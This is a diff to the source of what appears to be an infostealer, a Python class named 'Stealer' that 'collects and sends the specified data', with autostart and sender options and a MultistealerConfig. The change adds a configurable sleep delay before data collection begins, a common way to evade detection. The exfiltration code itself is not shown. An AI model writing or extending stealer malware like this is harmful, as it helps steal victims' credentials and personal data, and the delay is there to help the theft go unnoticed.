@@ -1,4 +1,5 @@
 from sys import argv
+from time import sleep
 from threading import Thread
 from multiprocessing import Pool
 from os import path, makedirs, remove
@@ -16,7 +17,7 @@ class Stealer(Thread):
     Collects and sends the specified data.
     """
 
-    def __init__(self, senders: list = None, features: list = None, utils: list = None):
+    def __init__(self, senders: list = None, features: list = None, utils: list = None, delay: int = 0):
         Thread.__init__(self, name="Stealer")
 
         if utils is None:
@@ -31,6 +32,7 @@ class Stealer(Thread):
         self.__senders = senders
         self.__autostart = True if Utils.autostart in utils else False
         self.__message = True if Utils.message in utils else False
+        self.__delay = delay
 
         self.__config = MultistealerConfig()
 
@@ -209,6 +211,8 @@ class Stealer(Thread):
         - None.
         """
         try:
+
+            sleep(self.__delay)
 
             self.__create_storage()
 
